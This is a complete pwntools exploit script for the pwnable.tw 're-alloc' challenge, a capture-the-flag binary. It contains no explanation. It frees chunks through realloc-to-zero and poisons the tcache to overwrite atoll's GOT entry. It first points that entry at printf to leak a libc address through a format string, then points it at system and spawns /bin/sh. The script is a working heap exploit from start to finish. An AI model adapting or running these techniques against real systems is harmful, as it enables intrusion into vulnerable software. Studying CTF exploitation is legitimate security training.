from pwn import *
# p = remote("chall.pwnable.tw", 10106)
elf = ELF("./re-alloc")
libc = ELF("./libc-2.29.so")
p = elf.process()
# context.log_level = "debug"

def add(idx,size,data):
	p.sendlineafter("Your choice: ",str(1))
	p.recvuntil("Index:")
	p.sendline(str(idx))
	p.recvuntil("Size:")
	p.sendline(str(size))
	p.recvuntil("Data:")
	p.send(data)

def edit(idx,size,data):
	p.sendlineafter("Your choice: ",str(2))
	p.recvuntil("Index:")
	p.sendline(str(idx))
	p.recvuntil("Size:")
	p.sendline(str(size))
	if size!=0:
		p.recvuntil("Data:")
		p.send(data)

def delete(idx):
	p.sendlineafter("Your choice: ",str(3))
	p.recvuntil("Index:")
	p.sendline(str(idx))

add(0,0x18,'a'*8)
edit(0,0,'') # free
edit(0,0x18,p64(0x404048)) # chunk0 -> atoll_got()  tcache[0x20]
add(1,0x18,'a'*8)
# clear heap[0],heap[1]
edit(0,0x38,'a'*8) # chunk0 -> 0x38  tcache[0x40]
delete(0)
edit(1,0x38,'b'*0x10) 
delete(1)
#again
add(0,0x48,'a'*0x8)
edit(0,0,'')
edit(0,0x48,p64(0x404048))# chunk0 -> atoll_got()  tcache[0x50]
add(1,0x48,'a'*0x8)
edit(0,0x58,'a'*8)# chunk0 -> 0x38  tcache[0x60]
delete(0)
edit(1,0x58,'b'*0x10)
delete(1)

add(0,0x48,p64(0x00401070))# plt_printf
p.sendlineafter("Your choice: ",str(1))
p.recvuntil("Index:")
p.sendline('%paaa%pbbb%p')
# p.recv()
p.recvuntil('bbb')
libc.address=int(p.recv(14),16)-0x12e009
info("libc: "+hex(libc.address))

p.sendlineafter("Your choice: ",str(1))
p.recvuntil(":")
p.sendline('a'+'\x00')# idx = 1
p.recvuntil(":")
p.send('%15c')# size = 15
p.recvuntil("Data:")
p.send(p64(libc.sym['system']))
p.sendlineafter("Your choice: ",str(3))
p.recvuntil("Index:")
p.sendline("/bin/sh\x00")
p.interactive()
